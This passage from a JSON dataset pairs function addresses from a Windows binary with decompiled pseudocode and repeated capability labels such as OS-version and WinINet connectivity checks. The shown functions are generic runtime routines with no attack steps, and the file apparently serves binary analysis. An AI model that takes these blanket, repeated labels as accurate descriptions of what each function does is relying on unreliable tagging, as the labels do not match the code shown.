            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040caa8(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x40cae0);\n    if (iVar1 != 0) {\n        *0x461130 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x40caf0);\n    }\n    if (*0x461130 == NULL) {\n        *0x461130 = fcn.00408568;\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "0040d4bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040d4bc(void)\n\n{\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x40d524;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    bVar1 = *0x463790 == 0;\n    *0x463790 = *0x463790 + -1;\n    if (bVar1) {\n        fcn.00403d54();\n        fcn.00403d7c();\n        if (*0x463661 != '\\0') {\n            fcn.00403ffc();\n        }\n        fcn.0040bbf4();\n        fcn.0040bcf8();\n        fcn.0040caa8();\n        fcn.0040c640();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 223
    },
    "0040d9c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040d9c0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EDX;\n    \n    iVar1 = in_EDX;\n    if (*(arg_8h + -4) != 0) {\n        iVar1 = sub.kernel32.dll_GetProcAddress_1(*(arg_8h + -4));\n        if (iVar1 == 0) {\n            iVar1 = in_EDX;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 113
    },
    "0040f094": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040f094(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint *puStack40;\n    uint pvarg;\n    uint var_14h;\n    int32_t *var_ch;\n    char var_5h;\n    uint *var_4h;\n    \n    if (param_2 != NULL) {\n        *param_2 = 0;\n    }\n    puStack40 = 0x40f0b6;\n    var_4h = param_2;\n    uVar1 = fcn.004104b0();\n    var_5h = uVar1;\n    if (var_5h != '\\0') {\n        puStack40 = &fcn.0040f094::pvarg;\n        puStack44 = 0x40f0c8;\n        sub.oleaut32.dll_VariantInit();\n        uStack48 = 0x40f109;\n        uStack52 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffcc;\n        puStack44 = &stack0xfffffffc;\n        (**(*var_ch + 0x1c))();\n        fcn.00403ffc();\n        *in_FS_OFFSET = 0x100;\n        uStack48 = 0x40f110;\n        uStack52 = 0x40f108;\n        uVar1 = fcn.0040eac4();\n        return uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 349
    },
    "0040f118": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040f118(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    float10 fVar4;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = &stack0xfffffffc;\n    iVar3 = 0xf;\n    do {\n        var_4h = 0;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_18h = 0x40f64f;\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0040f118::var_1ch;\n    uVar1 = *param_2;\n    // switch table (21 cases) at 0x40f151\n    switch(uVar1) {\n    case 0:\n        var_14h = &stack0xfffffffc;\n        fcn.00403fa8();\n        break;\n    case 1:\n        var_14h = &stack0xfffffffc;\n        if (*0x461318 != '\\0') {\n            var_14h = &stack0xfffffffc;\n            fcn.0040e364();\n        }\n        fcn.00403ffc();\n        break;\n    case 2:\n        var_14h = &stack0xfffffffc;\n        fcn.00407e50();\n        fcn.00403ffc();\n        break;\n    case 3:\n        var_14h = &stack0xfffffffc;\n        fcn.00407e50();\n        fcn.00403ffc();\n        break;\n    case 4:\n        fVar4 = *(param_2 + 4);\n        var_28h = SUB104(fVar4, 0);\n        var_24h = fVar4 >> 0x20;\n        var_20h._0_1_ = fVar4 >> 0x40;\n        var_14h = &stack0xfffffffc;\n        fcn.004093e4(var_28h);\n        fcn.00403ffc(var_28h, var_24h, var_20h);\n        break;\n    case 5:\n        fVar4 = *(param_2 + 4);\n        var_28h = SUB104(fVar4, 0);\n        var_24h = fVar4 >> 0x20;\n        var_20h._0_1_ = fVar4 >> 0x40;\n        var_14h = &stack0xfffffffc;\n        fcn.004093e4(var_28h);\n        fcn.00403ffc(var_28h, var_24h, var_20h);\n        break;\n    case 6:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.0040ee30(var_24h, *(param_2 + 6));\n        fcn.00404230();\n        break;\n    case 7:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.0040ee68(var_24h, *(param_2 + 6));\n        fcn.00404230();\n        break;\n    case 8:\n        var_14h = &stack0xfffffffc;\n        fcn.00404798();\n        fcn.00404884(&fcn.0040f118::var_1ch);\n        var_24h = 0x40f2b5;\n        fcn.00404230();\n        break;\n    case 9:\n    case 0xd:\n        var_14h = &stack0xfffffffc;\n        fcn.0040ef64();\n        fcn.00403ffc();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            var_14h = &stack0xfffffffc;\n            fcn.00403ffc();\n        }\n        else if (uVar1 == 0x101) {\n            var_14h = &stack0xfffffffc;\n            fcn.0040f030();\n            fcn.00403ffc();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            var_14h = &stack0xfffffffc;\n            fcn.00403fa8();\n            cVar2 = fcn.0040f094();\n            if (cVar2 == '\\0') {\n                fcn.0040ef64();\n                fcn.00403ffc();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x40f3e5\n            switch(uVar1 & 0xbfff) {\n            default:\n                var_14h = &stack0xfffffffc;\n                fcn.0040ef64();\n                fcn.00403ffc();\n                break;\n            case 2:\n                var_14h = &stack0xfffffffc;\n                fcn.00407e50();\n                fcn.00403ffc();\n                break;\n            case 3:\n                var_14h = &stack0xfffffffc;\n                fcn.00407e50();\n                fcn.00403ffc();\n                break;\n            case 4:\n                fVar4 = **(param_2 + 4);\n                var_28h = SUB104(fVar4, 0);\n                var_24h = fVar4 >> 0x20;\n                var_20h._0_1_ = fVar4 >> 0x40;\n                var_14h = &stack0xfffffffc;\n                fcn.004093e4(var_28h);\n                fcn.00403ffc(var_28h, var_24h, var_20h);\n                break;\n            case 5:\n                fVar4 = **(param_2 + 4);\n                var_28h = SUB104(fVar4, 0);\n                var_24h = fVar4 >> 0x20;\n                var_20h._0_1_ = fVar4 >> 0x40;\n                var_14h = &stack0xfffffffc;\n                fcn.004093e4(var_28h);\n                fcn.00403ffc(var_28h, var_24h, var_20h);\n                break;\n            case 6:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.0040ee30(var_24h, (*(param_2 + 4))[1]);\n                fcn.00404230();\n                break;\n            case 7:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.0040ee68(var_24h, (*(param_2 + 4))[1]);\n                fcn.00404230();\n                break;\n            case 8:\n                var_14h = &stack0xfffffffc;\n                fcn.004041d0();\n                break;\n            case 0xb:\n                var_14h = &stack0xfffffffc;\n                fcn.0040eea0();\n                fcn.00404230();\n                break;\n            case 0xc:\n                var_14h = &stack0xfffffffc;\n                fcn.0040f118();\n                break;\n            case 0x10:\n                var_14h = &stack0xfffffffc;\n                fcn.00407e50();\n                fcn.00403ffc();\n                break;\n            case 0x11:\n                var_14h = &stack0xfffffffc;\n                fcn.00407e50();\n                fcn.00403ffc();\n                break;\n            case 0x12:\n                var_14h = &stack0xfffffffc;\n                fcn.00407e50();\n                fcn.00403ffc();\n                break;\n            case 0x13:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00407f3c(var_24h);\n                fcn.00403ffc(var_24h, 0);\n                break;\n            case 0x14:\n                var_20h._0_1_ = (*(param_2 + 4))[1];\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00407f3c(var_24h);\n                fcn.00403ffc(var_24h, var_20h);\n            }\n        }\n        break;\n    case 0xb:\n        var_14h = &stack0xfffffffc;\n        fcn.0040eea0();\n        fcn.00404230();\n        break;\n    case 0xc:\n        var_14h = &stack0xfffffffc;\n        fcn.0040f118();\n        break;\n    case 0x10:\n        var_14h = &stack0xfffffffc;\n        fcn.00407e50();\n        fcn.00403ffc();\n        break;\n    case 0x11:\n        var_14h = &stack0xfffffffc;\n        fcn.00407e50();\n        fcn.00403ffc();\n        break;\n    case 0x12:\n        var_14h = &stack0xfffffffc;\n        fcn.00407e50();\n        fcn.00403ffc();\n        break;\n    case 0x13:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.00407f3c(var_24h);\n        fcn.00403ffc(var_24h, 0);\n        break;\n    case 0x14:\n        var_20h._0_1_ = *(param_2 + 6);\n        var_24h = *(param_2 + 4);\n        fcn.00407f3c(var_24h);\n        fcn.00403ffc(var_24h, var_20h);\n    }\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x40f656;\n    fcn.00403fcc();\n    fcn.004046a0();\n    fcn.00403fcc();\n    fcn.004046a0();\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 2575
    },
    "0040f778": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040f778(uint param_1, uint *param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint *arg_8h;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint pvarg;\n    uint var_14h;\n    int32_t *var_ch;\n    char var_5h;\n    uint *var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    if (param_2 != NULL) {\n        *param_2 = 0;\n    }\n    uStack48 = 0x40f830;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack56 = 0x40f7ad;\n    var_4h = param_2;\n    var_5h = fcn.004104b0();\n    if (var_5h != '\\0') {\n        puStack56 = &fcn.0040f778::pvarg;\n        puStack60 = 0x40f7bf;\n        sub.oleaut32.dll_VariantInit();\n        uStack64 = 0x40f813;\n        uStack68 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffbc;\n        puStack60 = &stack0xfffffffc;\n        (**(*var_ch + 0x1c))(8);\n        arg_8h = var_4h;\n        fcn.00404798();\n        fcn.00404884(arg_8h);\n        *in_FS_OFFSET = arg_8h;\n        uStack68 = 0x40f81a;\n        fcn.0040eac4();\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x40f837;\n    uStack48 = 0x40f82f;\n    fcn.00404688();\n    return;\n}\n",
        "token_count": 457
    },
    "0040f840": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040f840(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    float10 fVar3;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_ch = 0xe;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_1ch = 0x40fd92;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0040f840::var_20h;\n    uVar1 = *param_2;\n    // switch table (21 cases) at 0x40f87a\n    switch(uVar1) {\n    case 0:\n        var_18h = &stack0xfffffffc;\n        fcn.00404688();\n        break;\n    case 1:\n        var_18h = &stack0xfffffffc;\n        if (*0x461318 != '\\0') {\n            var_18h = &stack0xfffffffc;\n            fcn.0040e364();\n        }\n        fcn.004047d4();\n        break;\n    case 2:\n        var_18h = &stack0xfffffffc;\n        fcn.00407e50();\n        fcn.004047d4();\n        break;\n    case 3:\n        var_18h = &stack0xfffffffc;\n        fcn.00407e50();\n        fcn.004047d4();\n        break;\n    case 4:\n        fVar3 = *(param_2 + 4);\n        var_2ch = SUB104(fVar3, 0);\n        var_28h = fVar3 >> 0x20;\n        var_24h._0_1_ = fVar3 >> 0x40;\n        var_18h = &stack0xfffffffc;\n        fcn.004093e4(var_2ch);\n        fcn.004047d4(var_2ch, var_28h, var_24h);\n        break;\n    case 5:\n        fVar3 = *(param_2 + 4);\n        var_2ch = SUB104(fVar3, 0);\n        var_28h = fVar3 >> 0x20;\n        var_24h._0_1_ = fVar3 >> 0x40;\n        var_18h = &stack0xfffffffc;\n        fcn.004093e4(var_2ch);\n        fcn.004047d4(var_2ch, var_28h, var_24h);\n        break;\n    case 6:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.0040ee30(var_28h, *(param_2 + 6));\n        fcn.004046c4();\n        break;\n    case 7:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.0040ee68(var_28h, *(param_2 + 6));\n        fcn.004046c4();\n        break;\n    case 8:\n        var_18h = &stack0xfffffffc;\n        fcn.00404798();\n        var_28h = 0x40f9d1;\n        fcn.00404884(in_EAX);\n        break;\n    case 9:\n    case 0xd:\n        var_18h = &stack0xfffffffc;\n        fcn.0040f65c();\n        fcn.004046c4();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            var_18h = &stack0xfffffffc;\n            fcn.004047d4();\n        }\n        else if (uVar1 == 0x101) {\n            var_18h = &stack0xfffffffc;\n            fcn.0040f714();\n            fcn.004046c4();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            var_18h = &stack0xfffffffc;\n            fcn.00404688();\n            cVar2 = fcn.0040f778();\n            if (cVar2 == '\\0') {\n                fcn.0040f65c();\n                fcn.004046c4();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x40fb01\n            switch(uVar1 & 0xbfff) {\n            default:\n                var_18h = &stack0xfffffffc;\n                fcn.0040f65c();\n                fcn.004046c4();\n                break;\n            case 2:\n                var_18h = &stack0xfffffffc;\n                fcn.00407e50();\n                fcn.004047d4();\n                break;\n            case 3:\n                var_18h = &stack0xfffffffc;\n                fcn.00407e50();\n                fcn.004047d4();\n                break;\n            case 4:\n                fVar3 = **(param_2 + 4);\n                var_2ch = SUB104(fVar3, 0);\n                var_28h = fVar3 >> 0x20;\n                var_24h._0_1_ = fVar3 >> 0x40;\n                var_18h = &stack0xfffffffc;\n                fcn.004093e4(var_2ch);\n                fcn.004047d4(var_2ch, var_28h, var_24h);\n                break;\n            case 5:\n                fVar3 = **(param_2 + 4);\n                var_2ch = SUB104(fVar3, 0);\n                var_28h = fVar3 >> 0x20;\n                var_24h._0_1_ = fVar3 >> 0x40;\n                var_18h = &stack0xfffffffc;\n                fcn.004093e4(var_2ch);\n                fcn.004047d4(var_2ch, var_28h, var_24h);\n                break;\n            case 6:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.0040ee30(var_28h, (*(param_2 + 4))[1]);\n                fcn.004046c4();\n                break;\n            case 7:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.0040ee68(var_28h, (*(param_2 + 4))[1]);\n                fcn.004046c4();\n                break;\n            case 8:\n                var_18h = &stack0xfffffffc;\n                fcn.00404798();\n                break;\n            case 0xb:\n                var_18h = &stack0xfffffffc;\n                fcn.0040eea0();\n                fcn.004046c4();\n                break;\n            case 0xc:\n                var_18h = &stack0xfffffffc;\n                fcn.0040f840();\n                break;\n            case 0x10:\n                var_18h = &stack0xfffffffc;\n                fcn.00407e50();\n                fcn.004047d4();\n                break;\n            case 0x11:\n                var_18h = &stack0xfffffffc;\n                fcn.00407e50();\n                fcn.004047d4();\n                break;\n            case 0x12:\n                var_18h = &stack0xfffffffc;\n                fcn.00407e50();\n                fcn.004047d4();\n                break;\n            case 0x13:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00407f3c(var_28h);\n                fcn.004047d4(var_28h, 0);\n                break;\n            case 0x14:\n                var_24h._0_1_ = (*(param_2 + 4))[1];\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00407f3c(var_28h);\n                fcn.004047d4(var_28h, var_24h);\n            }\n        }\n        break;\n    case 0xb:\n        var_18h = &stack0xfffffffc;\n        fcn.0040eea0();\n        fcn.004046c4();\n        break;\n    case 0xc:\n        var_18h = &stack0xfffffffc;\n        fcn.0040f840();\n        break;\n    case 0x10:\n        var_18h = &stack0xfffffffc;\n        fcn.00407e50();\n        fcn.004047d4();\n        break;\n    case 0x11:\n        var_18h = &stack0xfffffffc;\n        fcn.00407e50();\n        fcn.004047d4();\n        break;\n    case 0x12:\n        var_18h = &stack0xfffffffc;\n        fcn.00407e50();\n        fcn.004047d4();\n        break;\n    case 0x13:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.00407f3c(var_28h);\n        fcn.004047d4(var_28h, 0);\n        break;\n    case 0x14:\n        var_24h._0_1_ = *(param_2 + 6);\n        var_28h = *(param_2 + 4);\n        fcn.00407f3c(var_28h);\n        fcn.004047d4(var_28h, var_24h);\n    }\n    *in_FS_OFFSET = var_28h;\n    var_20h = 0x40fd99;\n    fcn.004046a0();\n    fcn.00403fcc();\n    fcn.004046a0();\n    fcn.00403fcc();\n    fcn.004046a0();\n    fcn.00403fcc();\n    fcn.004046a0();\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 2608
    },
    "0040fda0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040fda0(char param_1, uint param_2)\n\n{\n    uint16_t *in_EAX;\n    \n    if ((*in_EAX & 0xbfe8) != 0) {\n        fcn.0040ea48();\n    }\n    if (*0x461320 == '\\0') {\n        *in_EAX = 3;\n    }\n    else {\n        *in_EAX = *(param_1 * 2 + 0x461334);\n    }\n    *(in_EAX + 4) = param_2;\n    return;\n}\n",
        "token_count": 128
    },
    "0041020c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0041020c(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    \n    uStack16 = 0x463824;\n    puStack20 = 0x410220;\n    sub.kernel32.dll_EnterCriticalSection_1();\n    uStack24 = 0x41026d;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    iVar1 = fcn.00404da0();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            if (*(*0x463820 + iVar1 * 4) != *0x461328) {\n                fcn.00403258();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x410274;\n    uStack24 = 0x463824;\n    uStack28 = 0x41026c;\n    sub.kernel32.dll_LeaveCriticalSection_1();\n    return;\n}\n",
        "token_count": 278
    },
    "004104b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.004104b0(uint param_1, uint *param_2)\n\n{\n    bool bVar1;\n    uint32_t in_EAX;\n    unkuint3 Var3;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint var_1h;\n    \n    if (((*0x463820 == 0) || (in_EAX < 0x100)) || (0x7ff < in_EAX)) {\n        bVar1 = false;\n        Var3 = 0;\n    }\n    else {\n        Var3 = in_EAX >> 8;\n        bVar1 = true;\n    }\n    if (bVar1) {\n        uStack24 = 0x463824;\n        puStack28 = 0x4104eb;\n        sub.kernel32.dll_EnterCriticalSection_1();\n        uStack32 = 0x410558;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &fcn.004104b0::var_1h + 1;\n        iVar2 = fcn.00404da0();\n        if ((in_EAX & 0xffff) - 0x100 < iVar2) {\n            *param_2 = *(*0x463820 + -0x400 + (in_EAX & 0xffff) * 4);\n        }\n        *in_FS_OFFSET = uStack36;\n        puStack28 = 0x41055f;\n        uStack32 = 0x463824;\n        uStack36 = 0x410557;\n        iVar2 = sub.kernel32.dll_LeaveCriticalSection_1();\n        return iVar2;\n    }\n    return Var3 << 8;\n}\n",
        "token_count": 417
    },
    "00410920": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00410920(void)\n\n{\n    char cVar1;\n    char *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (*in_EAX == '\\x01') {\n        uVar2 = fcn.00407f8c();\n        return uVar2;\n    }\n    iVar3 = fcn.004108c8();\n    if (*(iVar3 + 1) < 0) {\n        cVar1 = fcn.00407c50();\n        if (cVar1 == '\\0') {\n            cVar1 = fcn.00407c50();\n            if (cVar1 == '\\0') {\n                uVar2 = fcn.00407f8c();\n            }\n            else {\n                uVar2 = 0xffffffff;\n            }\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = fcn.004108d4();\n    }\n    return uVar2;\n}\n",
        "token_count": 218
    },
    "004109f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004109f4(uint param_1, uint *param_2)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint8_t uVar5;\n    \n    pcVar1 = **param_2;\n    uVar5 = 4;\n    if (*pcVar1 != '\\a') {\n        uVar5 = pcVar1[pcVar1[1] + 2];\n    }\n    pcVar2 = param_2[1];\n    if (*(param_2 + 7) < 0xfe) {\n        uVar3 = (*pcVar2)();\n    }\n    else if (*(param_2 + 7) == 0xff) {\n        puVar4 = (pcVar2 & 0xffffff) + in_EAX;\n        uVar3 = in_EAX & 0xffffff00 | *puVar4;\n        if ((1 < uVar5) && (uVar3 = in_EAX & 0xffff0000 | *puVar4,  3 < uVar5)) {\n            uVar3 = *puVar4;\n        }\n    }\n    else {\n        uVar3 = (**(pcVar2 + *in_EAX))();\n    }\n    if (uVar5 < 4) {\n        if (uVar5 < 2) {\n            uVar3 = uVar3;\n            if (uVar5 != 0) {\n                return uVar3 & 0xff;\n            }\n        }\n        else {\n            uVar3 = uVar3;\n            if (uVar5 != 2) {\n                uVar3 = uVar3 & 0xffff;\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 398
    },
    "00414314": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00414314(int32_t arg_8h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 4) == 0) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        uVar1 = (**(**(arg_8h + 4) + 4))(*(arg_8h + 4));\n    }\n    return uVar1;\n}\n",
        "token_count": 94
    },
    "00414334": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
